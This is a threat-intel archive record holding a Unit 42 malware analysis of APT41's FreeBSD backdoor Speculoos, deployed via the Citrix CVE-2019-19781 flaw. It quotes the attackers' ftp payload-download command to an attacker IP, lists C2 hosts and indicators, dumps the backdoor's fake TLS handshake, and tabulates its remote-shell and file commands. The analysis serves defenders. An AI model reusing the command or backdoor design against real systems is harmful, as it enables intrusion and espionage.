{
    "id": "d18be3fd-19ad-4981-b794-0970008988d5",
    "created_at": "2023-01-12T14:59:03.120835Z",
    "updated_at": "2025-03-27T02:16:16.929724Z",
    "deleted_at": null,
    "sha1_hash": "b9e300c23fa346508203317ee203d8c24af1905d",
    "title": "2020-04-13 - APT41 Using New Speculoos Backdoor to Target Organizations Globally",
    "authors": "",
    "file_creation_date": "2022-05-28T15:08:31Z",
    "file_modification_date": "2022-05-28T15:08:31Z",
    "file_size": 381227,
    "plain_text": "# APT41 Using New Speculoos Backdoor to Target Organizations Globally\n\n**[unit42.paloaltonetworks.com/apt41-using-new-speculoos-backdoor-to-target-organizations-globally/](https://unit42.paloaltonetworks.com/apt41-using-new-speculoos-backdoor-to-target-organizations-globally/)**\n\nBryan Lee, Robert Falcone, Jen Miller-Osborn April 14, 2020\n\nBy [Bryan Lee,](https://unit42.paloaltonetworks.com/author/bryanlee/) [Robert Falcone and](https://unit42.paloaltonetworks.com/author/robertfalcone/) [Jen Miller-Osborn](https://unit42.paloaltonetworks.com/author/jen-miller-osborn/)\n\nApril 13, 2020 at 5:45 PM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [APT41,](https://unit42.paloaltonetworks.com/tag/apt41/) [Citrix,](https://unit42.paloaltonetworks.com/tag/citrix/) [CVE-2019-19781,](https://unit42.paloaltonetworks.com/tag/cve-2019-19781/) [Espionage,](https://unit42.paloaltonetworks.com/tag/espionage/) [FreeBSD,](https://unit42.paloaltonetworks.com/tag/freebsd/) [Speculoos](https://unit42.paloaltonetworks.com/tag/speculoos/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/apt41-using-new-speculoos-backdoor-to-target-organizations-globally/)\n\n## Executive Summary\n\n[On March 25, 2020, FireEye published a research blog regarding a global attack campaign](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html)\noperated by an espionage motivated adversary group known as APT41. This attack\ncampaign was thought to have operated between January 20 and March 11, specifically\n\n\n-----\n\ntargeting Citrix, Cisco, and Zoho network appliances via exploitation of recently disclosed\nvulnerabilities. Based on WildFire and AutoFocus data available to Unit 42, we were able to\nobtain samples of the payload targeting Citrix appliances, which were executables compiled\nto run on FreeBSD. We also used this data to identify multiple victims in industries such as\nhealthcare, higher education, manufacturing, government and technology services in multiple\nregions around the world, such as North America, South America, and Europe.\n\nThis blog will be specific to the FreeBSD-based payload that we have named Speculoos. We\nidentified a total of five samples from our dataset, all of which were approximately the same\nfile size, but contain minute differences amongst the sample set. The subtle differences\nindicate that they likely originated from the same developer and were either recompiled or\npatched. As described by FireEye, Speculoos was delivered by exploiting CVE-2019-19781,\na vulnerability affecting the Citrix Application Delivery Controller, Citrix Gateway, and Citrix\nSD-WAN WANOP appliances that allowed an adversary to remotely execute arbitrary\ncommands. This vulnerability was first disclosed on December 17, 2019 via security bulletin\n[CTX267679 which contained several mitigation recommendations. By January 24, 2020,](https://support.citrix.com/article/CTX267027)\npermanent patches for the affected appliances were issued. Based on the spread of\nindustries and regions, in addition to the timing of the vulnerability disclosure, we believe this\ncampaign may have been more opportunistic in nature compared to the highly targeted\nattack campaigns that are often associated with these types of adversaries. However,\nconsidering the exploitation of the vulnerability in conjunction with delivery of a backdoor\nspecifically designed to execute on the associated FreeBSD operating system indicates the\nadversary was absolutely targeting the affected devices.\n\n[Palo Alto Networks customers are protected from this threat. Our threat prevention platform](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention)\nwith [Wildfire identifies this malware as malicious while simultaneously updating the ‘malware’](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n[category within the PAN-DB URL filtering solution for malicious and/or compromised domains](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\nthat have been identified. AutoFocus customers can continue to track Speculoos activity by\nusing the [Speculoos tag.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Speculoos)\n\n### Attack Details\n\nIn this attack campaign, the adversaries exploited CVE-2019-19781 to direct the victim\nappliances to retrieve Speculoos over FTP using the command /usr/bin/ftp -o /tmp/bsd\nftp://test:[redacted]\\@66.42.98[.]220/<filename> as reported by FireEye. Our data was\nconsistent with this activity, with the first wave beginning on January 31, 2020 evening UTC\nto February 1, 2020 afternoon UTC using the filename bsd. This wave affected multiple\nhigher education organizations in the United States, a healthcare organization in the United\nStates, and a consulting firm in Ireland. A second wave began on February 24, 2020 morning\nUTC through February 24, 2020 after midnight UTC, this time using the filename un. This\nwave affected a higher education organization in Colombia, a manufacturing organization in\nAustria, a higher education organization targeted in the first wave in the United States, and a\nstate government in the United States. While the data Unit 42 has access to is not\n\n\n-----\n\nexhaustive, examining the spread of victims we do have data on appears to indicate that this\nattack campaign may have been more of an opportunistic push by APT41 to gain footholds\nin a large number of organizations with minimal effort to expand their attack infrastructure.\n\nThe deployment of a tool to run specifically on FreeBSD is fairly novel. Malware targeting\nBSD-based systems are relatively rare, and considering the use of this tool in conjunction\nwith a vulnerability affecting specific Citrix network appliances, it is highly likely Speculoos\nwas specifically crafted for this attack campaign by APT41.\n\n### Binary Analysis\n\nThe Speculoos backdoor is an ELF executable compiled with GCC 4.2.1 to run on a\nFreeBSD system. This payload does not appear to natively be able to maintain persistence,\nso it is likely it requires the adversary to use a separate component or additional step to\nmaintain their foothold. Upon execution, the payload enters a loop that calls a function to\ncommunicate with the following command and control (C2) domain over TCP/443:\n\nalibaba.zzux[.]com (resolving to 119.28.139[.]120)\n\nIf it is unable to communicate with the domain above, Speculoos will attempt to use a backup\nC2 at 119.28.139[.]20, also over TCP/443. If it is able to connect to either C2 server, it will\ncarry out a TLS handshake with the server using the hardcoded buffer in the binary which is\nused as the first packet in the handshake. Before sending the hardcoded buffer to the C2\nserver, Speculoos modifies offset 11 with the current time and offset 15 with 28\npseudorandom bytes generated by iterating through the domain string, adding the current\ntime and then using XOR on each byte with 7 multiplied by the byte's offset as a key. Figure\n1 shows the hardcoded buffer before Speculoos modifies and sends it to the C2 server.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n16 03 01 00 B5 01 00 00 B1 03 01 00 00 00 00 00 ................\n\n00 00 00 00 00 6A CE 14 27 3F 24 92 AB 0A A3 F7 .....j..'?$.....\n\nDB 21 1C D6 7F FD E3 A3 50 00 00 00 00 48 C0 0A .............H..\n\nC0 14 00 88 00 87 00 39 00 38 C0 0F C0 05 00 84 .......9.8......\n\n00 35 C0 07 C0 09 C0 11 C0 13 00 45 00 44 00 66 .5.........E.D.f\n\n00 33 00 32 C0 0C C0 0E C0 02 C0 04 00 96 00 41 .3.2...........A\n\n00 04 00 05 00 2F C0 08 C0 12 00 16 00 13 C0 0D ...../..........\n\nC0 03 FE FF 00 0A 02 01 00 00 3F 00 00 00 13 00 ..........?.....\n\n11 00 00 0E 6C 6F 67 69 6E 2E 6C 69 76 65 2E 63 ....login.live.c\n\n6F 6D FF 01 00 01 00 00 0A 00 08 00 06 00 17 00 om..............\n\n18 00 19 00 0B 00 02 01 00 00 23 00 00 33 74 00 ..........#..3t.\n\n00 00 05 00 05 01 00 00 00 00 ..........\n\n\n_Figure 1. Hardcoded buffer used as the TLS Client Hello packet sent to the C2 server_\n\nFigure 1 suggests that this is a handshake packet for TLS 1.0, specifically the Client Hello.\nThe most interesting part of this Client Hello packet is that it is requesting login.live[.]com as\nthe Server Name Indication (SNI), which suggests that the author may try to make the\nhandshake look innocuous, as seen in Figure 1.\n\n\n-----\n\nFigure 2. Client Hello packet in the TLS handshake uses login.live.com as the Server Name\nIndication\nAfter successfully connecting to the C2 and completing the TLS handshake, Speculoos will\nperform an initial system enumeration to fingerprint the victim system then send the data\nback to the C2 server. The buffer used to store the information will be 1048 bytes and will be\nstructured as seen in Table 1 below.\n\n**Offset** **Description** **Notes**\n\n0 Identifier Hardcoded string “freebsd”\n\n64 Unknown Hardcoded “5”\n\n68 Username Uses ‘getuid’ to get user of process, then ‘getpwuid.pw_name’ to\nget the name\n\n\n132 MAC\naddresses\n\n\nUses if_nameindex to iterate through interfaces\n\n\n152 OS version Results of ‘uname-v’\n\n216 Hostname Results of ‘uname-s’ or ‘hostname’\n\n\n-----\n\n280 Disk space Enumerates file systems at ‘/’ and ‘/private/var’\n\n\n904 Physical\nmemory\n\n\nSysctl hw.physmem\n\n\n908 User memory Sysctl hw.usermem\n\n\n912 Number of\nCPUs\n\n\nSysctl hw.ncpu\n\n\n916 CPU speed Sysctl machdep.tsc_freq/1000000\n\n920 CPU model Sysctl hw.model\n\n_Table 1. Structure used to transmit gathered system information to the C2_\n\nThe data is sent over the TLS channel and two bytes of data are expected in response by\nSpeculoos. After a successful response, it will then send a single byte (0xa) to the C2 and\nenter a loop to begin receiving commands. The commands in Table 2 are then made\navailable for the adversary to execute on the victim system. The commands available to\nSpeculoos indicate that this tool is a fully functional backdoor which gives the adversary full\ncontrol over the victim system.\n\n\n**Command** **Sub-**\n**command**\n\n\n**Description**\n\n\n0x1E Creates shell related sub-command handler\n\nw (0x77) Creates a remote shell by forking off a “/bin/sh” process and\nredirects standard input, output and error to the TLS socket\n\nf (0x66) Creates disk related sub-command handler\n\nf (0x66) Remove File (unlink function)\n\nk (0x6B) Remove Directory (rm -rf \"<path>\")\n\ne (0x65) Run specified file (execv)\n\ng (0x67) Download file\n\ni (0x69) Upload file\n\n0x14 Enumerate Processes (Name, PID, PPID, Threads)\n\n0x15 Kill process\n\n0x1 List Folder Contents\n\n! (0x21) Execute command using “sh -c”\n\n\n-----\n\n_Table 2. Commands in Speculoos s command handler_\n\nThe two Speculoos samples we analyzed were functionally identical, with only eight bytes\ndiffering between the two. This eight byte change was caused by the author replacing the\nuname -s command with the hostname command when gathering system information. It is\nunclear why the command may have been changed, as they return different results. uname s will return the kernel information which would be the string FreeBSD on a FreeBSD\nsystem, while hostname would return print the name of the host system. Figure 2 shows a\nbinary comparison between the two Speculoos samples we analyzed that shows the eight\nbyte difference.\n\nFigure\n\n3. Binary comparison between two Speculoos samples showing different commands used to\ngather the hostname of the system\n\n### Impact Assessment\n\nVulnerabilities that allow for remote code execution by unauthorized users are nearly always\na potentially high impact security issue, especially if they affect systems that are publicfacing. In this case, CVE-2019-19781 affected multiple appliances that were may be publicfacing, and had a highly motivated adversary actively exploiting the vulnerability to install a\ncustom backdoor. Considering the types of appliances that were affected, it is critical that\nany organization that may be affected take mitigation actions immediately. Because all or a\nsignificant amount of network activity must traverse these compromised network appliances,\nadversaries can more easily monitor or modify an entire organization’s network activity\ninstead of being relegated to a single or handful of devices.\n\nIn addition, because by default these appliances have access to a large number of\norganizational systems, lateral movement becomes far less of a challenge. The adversaries\nmay attempt to directly traverse into other hosts that must traverse through the compromised\nappliances, or even be able to modify network traffic to perform additional malicious actions,\nsuch as injecting/delivering malicious code, executing man-in-the-middle attacks, or\nredirecting users to adversary owned login pages to harvest credentials. Lastly, due to the\nnature of appliances, detection of these attacks may be significantly more challenging, as\ngenerally they are black-box type solutions which are not often interacted with or inspected\nfor anomalous activity, unless an issue arises.\n\n\n-----\n\nPalo Alto Networks customers may be protected by\n\nDeploying Threat ID 57625, 57570, and 57497\nWildFire properly classifies Speculoos as malicious\nC2 domain has been classified as malicious in DNS Security\n[AutoFocus customers may learn more via the Speculoos tag](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Speculoos)\n\n### Indicators of Compromise\n\nAnalyzed Speculoos SHA256\n\n99c5dbeb545af3ef1f0f9643449015988c4e02bf8a7164b5d6c86f67e6dc2d28\n\n6943fbb194317d344ca9911b7abb11b684d3dca4c29adcbcff39291822902167\n\nAdditional Speculoos SHA256\n\n493574e9b1cc618b1a967ba9dabec474bb239777a3d81c11e49e7bb9c71c0c4e\n\n85297097f6dbe8a52974a43016425d4adaa61f3bdb5fcdd186bfda2255d56b3d\n\nc2a88cc3418b488d212b36172b089b0d329fa6e4a094583b757fdd3c5398efe1\n\nNetwork Indicators\n\n119.28.139[.]20\n\nalibaba.zzux[.]com\n\n119.28.139[.]120\n\n66.42.98[.]220\n\nexchange.longmusic[.]com\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-04-13 - APT41 Using New Speculoos Backdoor to Target Organizations Globally.pdf"
    ],
    "report_names": [
        "2020-04-13 - APT41 Using New Speculoos Backdoor to Target Organizations Globally.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535543,
    "ts_updated_at": 1743041776,
    "ts_creation_date": 1653750511,
    "ts_modification_date": 1653750511,
    "files": {
        "pdf": "https://archive.orkl.eu/b9e300c23fa346508203317ee203d8c24af1905d.pdf",
        "text": "https://archive.orkl.eu/b9e300c23fa346508203317ee203d8c24af1905d.txt",
        "img": "https://archive.orkl.eu/b9e300c23fa346508203317ee203d8c24af1905d.jpg"
    }
}